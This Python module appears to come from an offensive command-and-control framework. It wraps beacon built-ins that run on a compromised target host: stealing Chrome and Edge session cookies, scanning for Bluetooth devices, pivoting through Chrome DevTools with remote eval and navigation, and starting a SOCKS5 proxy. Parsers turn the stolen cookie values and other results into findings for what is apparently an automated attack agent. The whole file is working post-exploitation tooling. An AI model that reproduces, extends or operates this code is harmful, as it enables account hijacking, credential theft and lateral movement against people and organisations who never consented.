"""
harvest.py — credential/telemetry harvest + pivot built-ins of the beacon.

These commands are queued as tasks to the established beacon session and
execute on the TARGET host. They map 1:1 to the C++ built-ins shipped in
the beacon (cookie_stealer.h, bt_scan.h, cdp_pivot.h, proxy.h) — the agent
exposes them as first-class capabilities instead of leaving them orphaned
behind the C2 shell.
"""

from __future__ import annotations

import json
import re
from typing import Any, Dict, List

from phantom.automation.belief import Finding, WorldModel


# ---------------------------------------------------------------------------
# cookie_stealer.h — Chrome/Edge cookies (DPAPI + SQLite FreePage walker)
# ---------------------------------------------------------------------------

def cookies_command(profile: str = "") -> str:
    """COOKIES:[{host,name,path,value},...] — stolen session cookies."""
    if profile:
        return f"cookies-json {profile}"
    return "cookies-json"


def cookies_interpreter(output: str, wm: WorldModel,
                        slots: Dict[str, Any]) -> List[Finding]:
    if "COOKIES:" not in output:
        return []
    payload = output.split("COOKIES:", 1)[1].strip()
    try:
        cookies = json.loads(payload)
    except json.JSONDecodeError:
        return []
    if not isinstance(cookies, list) or not cookies:
        return []
    hosts = sorted({c.get("host", "") for c in cookies if c.get("host")})
    return [Finding(
        kind="stolen_cookies", key=f"cookies:{len(cookies)}",
        value={"count": len(cookies),
               "hosts": hosts[:20],
               "sample": cookies[0] if cookies else {},
               "cookies": [{"host": c.get("host", ""),
                            "name": c.get("name", ""),
                            "path": c.get("path", ""),
                            "value": c.get("value", "")[:400]}
                           for c in cookies[:50]]},
        confidence=0.9, source="cookie_stealer",
        evidence=output.strip()[:400])]


# ---------------------------------------------------------------------------
# bt_scan.h — Bluetooth proximity radar (BT_SCAN:[...])
# ---------------------------------------------------------------------------

def bt_scan_command() -> str:
    return "bt-scan-json"


def bt_scan_interpreter(output: str, wm: WorldModel,
                        slots: Dict[str, Any]) -> List[Finding]:
    if "BT_SCAN:" not in output:
        return []
    payload = output.split("BT_SCAN:", 1)[1].strip()
    try:
        devices = json.loads(payload)
    except json.JSONDecodeError:
        return []
    if not isinstance(devices, list):
        return []
    findings = []
    for d in devices:
        mac = d.get("mac", "")
        if not mac:
            continue
        findings.append(Finding(
            kind="bt_device", key=f"bt:{mac}",
            value={"name": d.get("name", ""), "mac": mac,
                   "rssi": d.get("rssi", 0), "dev_class": d.get("class", "")},
            confidence=0.8, source="bt_scan",
            evidence=json.dumps(d)[:200]))
    return findings


# ---------------------------------------------------------------------------
# cdp_pivot.h — Chrome DevTools pivot (launch/cookies/eval/nav/fetch)
# ---------------------------------------------------------------------------

def cdp_cookies_command(port: int = 9222) -> str:
    return f"cdp-cookies {port}"


def cdp_eval_command(expression: str, port: int = 9222) -> str:
    return f"cdp-eval {expression} {port}"


def cdp_nav_command(url: str, port: int = 9222) -> str:
    return f"cdp-nav {url} {port}"


def cdp_cookies_interpreter(output: str, wm: WorldModel,
                            slots: Dict[str, Any]) -> List[Finding]:
    # real C++ marker: "=== CDP COOKIES (N) ===\n<lines>"
    m = re.search(r"CDP COOKIES \((\d+)\)", output)
    if not m:
        return []
    return [Finding(
        kind="cdp_cookies", key=f"cdp:{slots.get('port', 9222)}",
        value={"count": int(m.group(1)), "port": slots.get("port", 9222)},
        confidence=0.8, source="cdp_pivot",
        evidence=output.strip()[:300])]


# ---------------------------------------------------------------------------
# proxy.h — SOCKS5 proxy pivot (socks <port> / socks-stop)
# ---------------------------------------------------------------------------

def socks_command(port: int = 1080) -> str:
    return f"socks {port}"


def socks_stop_command() -> str:
    return "socks-stop"


def socks_interpreter(output: str, wm: WorldModel,
                      slots: Dict[str, Any]) -> List[Finding]:
    # real C++ marker: "SOCKS5 proxy started on 0.0.0.0:<port>"
    if "SOCKS5 proxy started" not in output:
        return []
    return [Finding(
        kind="socks_proxy", key=f"socks:{slots.get('port', 1080)}",
        value={"port": slots.get("port", 1080)},
        confidence=0.9, source="proxy",
        evidence=output.strip()[:200])]
